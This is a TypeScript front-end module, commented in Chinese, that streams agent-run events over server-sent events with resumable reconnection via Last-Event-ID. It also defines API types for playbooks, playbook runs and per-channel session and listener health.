// v1.4.0：支持**断点续传**。服务端每个 run 事件带 `id: <seq>`，断线后按 `Last-Event-ID`
// 续传即可补齐缺口，不必退化成"只能靠 2s 轮询重建视图"。两类缺口由服务端用 `resync`
// 事件显式告知（缓冲淘汰 / 运行期丢事件），这里原样交给调用方处理，**不静默吞掉**。
//
// initialEventId：调用方（同一个 run 的上一轮）已经消费过的最大事件 id。它同时是**第一条连接**
// 的水位线——这是"只收本轮增量"的关键。实测（.tmp-verify 的 A/B）服务端缺省语义是两种：
//   - run 还在跑：`lastSent = snap.Head`（"从当前开始"）→ 连接建立前已 emit 的增量**永久丢失**
//     （实测：续接轮首个 SSE 晚 1.5s 连接，正文前 8 个字符不见了，流式正文从半句开始）；
//   - run 已终态：`snap.Tail(200)`（回放缓冲尾部，条数有上限）→ 该轮最早的一批增量被上限吃掉
//     （实测：一轮 300+ 增量时，无水位线只收到后 200 条，正文从第 103 个增量才开始）。
// 传了水位线就统一变成 `snap.After(lastID)`：不漏（水位线之后的都补发）也不重
// （水位线之前的一律不发，所以既不会把上一轮内容再发一遍，也不会重复追加已渲染的正文）。
async function streamAgent(
  runId: string,
  onEvent: (ev: AgentStreamEvent) => void,
  onDone: () => void,
  shouldContinue?: () => boolean,
  initialEventId = 0,
) {
  // 水位线初值 = 上一轮的最大事件 id（没有则 0 = 服务端默认语义）。
  let lastEventId = initialEventId > 0 ? Math.floor(initialEventId) : 0
  let retryMs = SSE_DEFAULT_RETRY_MS
  let terminal = false

  for (let attempt = 0; attempt <= SSE_MAX_RECONNECTS; attempt++) {
    if (attempt > 0) {
      if (shouldContinue && !shouldContinue()) break
      await new Promise((r) => setTimeout(r, retryMs))
      if (shouldContinue && !shouldContinue()) break
    }
    // 续传水位线：头优先（服务端认它），查询参数作为兜底（便于将来换成 EventSource）。
    const qs = lastEventId > 0 ? `?last_event_id=${lastEventId}` : ''
    const headers: Record<string, string> = { ...authHeaders(), Accept: 'text/event-stream' }
    if (lastEventId > 0) headers['Last-Event-ID'] = String(lastEventId)

    try {
      const resp = await fetch(`/api/v1/agent/runs/${runId}/events${qs}`, { headers })
      if (!resp.ok || !resp.body) {
        // 404（run 已不在内存）/ 5xx：重连也没意义，交给轮询与调用方
        onEvent({ event: 'error', data: { error: `stream ${resp.status}` } })
        break
      }
      const reader = resp.body.getReader()
      const decoder = new TextDecoder()
      let buf = ''
      let closed = false
      while (!closed) {
        const { value, done: d } = await reader.read()
        closed = d
        buf += decoder.decode(value || new Uint8Array(), { stream: !closed })
        // 解析 SSE：按 \n\n 切分事件块
        let idx: number
        while ((idx = buf.indexOf('\n\n')) >= 0) {
          const block = buf.slice(0, idx)
          buf = buf.slice(idx + 2)
          const parsed = parseSSEBlock(block)
          if (!parsed) continue
          if (parsed.id && parsed.id > lastEventId) lastEventId = parsed.id
          if (parsed.retryMs > 0) retryMs = parsed.retryMs
          onEvent({ event: parsed.event, data: parsed.data, id: parsed.id })
          if (parsed.event === 'done' || parsed.event === 'error' || (parsed.event === 'state' && parsed.data?.done)) {
            terminal = true
            closed = true
            break
          }
        }
        // 调用方已经不再关心这条流（典型场景：用户发出了下一轮指令，同一 run 换了一条新连接）：
        // 立刻停读并断开。同一个 run 的多个 SSE 连接是**分食**同一条事件通道的（服务端
        // `run.Events()` 是单通道，不是广播），上一轮遗留的连接多活一秒，就可能把本轮的事件
        // 抢走一半，表现成"本轮正文缺一段"。这里主动退场，把它让给本轮的那条连接。
        if (!closed && shouldContinue && !shouldContinue()) {
          try {
            await reader.cancel()
          } catch {
            /* 取消失败不影响后续：连接随请求对象一起被回收 */
          }
          closed = true
        }
      }
      if (terminal) break
      // 流自然结束（服务端在 run 终态后会主动收尾；这里多为网络中断/代理掐连接）→ 续传
    } catch (e) {
      // 连接层错误：同样按"续传"处理（轮询仍在跑，所以这里不当作致命错误）
      if (attempt >= SSE_MAX_RECONNECTS) {
        onEvent({ event: 'error', data: { error: (e as Error).message } })
        break
      }
    }
  }
  onDone()
}

interface ParsedSSEBlock {
  event: string
  data: any
  id: number
  retryMs: number
}

function parseSSEBlock(block: string): ParsedSSEBlock | null {
  let event = 'message'
  let data = ''
  let id = 0
  let retryMs = 0
  for (const line of block.split('\n')) {
    if (line.startsWith('event:')) event = line.slice(6).trim()
    else if (line.startsWith('data:')) data += line.slice(5).trim()
    else if (line.startsWith('id:')) id = Number(line.slice(3).trim()) || 0
    else if (line.startsWith('retry:')) retryMs = Number(line.slice(6).trim()) || 0
    // 其它行（含 `:` 心跳注释）忽略
  }
  if (!data) return null
  try {
    return { event, data: JSON.parse(data), id, retryMs }
  } catch {
    return { event, data, id, retryMs }
  }
}

// authHeaders 复用与 axios 相同的认证头（从 localStorage 取 token）。
function authHeaders(): Record<string, string> {
  const h: Record<string, string> = { 'Content-Type': 'text/event-stream' }
  const token = localStorage.getItem('toshell-token')
  if (token) h['Authorization'] = `Bearer ${token}`
  return h
}

export interface Playbook {
  id: string
  name: string
  desc: string
  steps: { name: string; tool: string }[]
  fallback: string
}
export interface PlaybookRun {
  id: string
  playbook: string
  session_id: string
  status: string
  results: { name: string; tool: string; status: string; output?: string; error?: string; task_id?: number }[]
  created_at: number
  analysis?: string
  batch_id?: string
}

// 通道健康：TCP/HTTP/WS/MQTT 四通道在线数/监听器数
export interface ChannelHealth {
  type: string
  online: number
  total_session: number
  listeners: number
  running: boolean
}
export const channelsApi = {
  health: () => api.get<{ channels: ChannelHealth[]; total_online: number; total_session: number }>('/channels/health'),
}

export default api
